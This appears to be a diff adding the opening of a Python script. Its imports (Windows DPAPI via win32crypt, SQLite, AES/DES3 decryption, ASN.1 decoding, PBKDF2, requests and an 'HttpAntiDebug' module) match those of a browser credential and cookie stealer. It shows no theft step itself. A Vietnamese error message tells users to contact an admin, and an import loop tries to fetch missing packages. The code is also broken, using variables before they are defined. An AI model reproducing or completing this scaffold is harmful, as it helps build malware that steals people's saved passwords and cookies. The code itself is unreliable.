@@ -1,0 +1,32 @@
+from os import name, system, devnull, _exit
+from subprocess import check_call, run, PIPE
+from shutil import get_terminal_size
+from random import choice, randint
+import sys
+
+def install_pip(package):
+    check_call([sys.executable, "-m", "pip", "install", package], stdout=PIPE, stderr=PIPE)
+
+while True:
+    try:
+        if debug_count == 2:
+            print(f"Error log : {error_log}")
+            print("Lỗi không xác định, vui lòng liên hệ admin để được giúp đỡ")
+            raise SystemExit
+        import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,time,re
+        from datetime import datetime,timedelta
+        from Crypto.Cipher import DES3
+        from Crypto.Cipher import AES
+        from pyasn1.codec.der import decoder
+        from hashlib import sha1, pbkdf2_hmac
+        from Crypto.Util.Padding import unpad 
+        from base64 import b64decode
+        import HttpAntiDebug as hd
+    except:
+        error_log    = e
+        debug_count  = debug_count + 1
+        module = [
+            "pyasn1"            ,
+            "pycryptodome"      ,
+        ]
+        continue
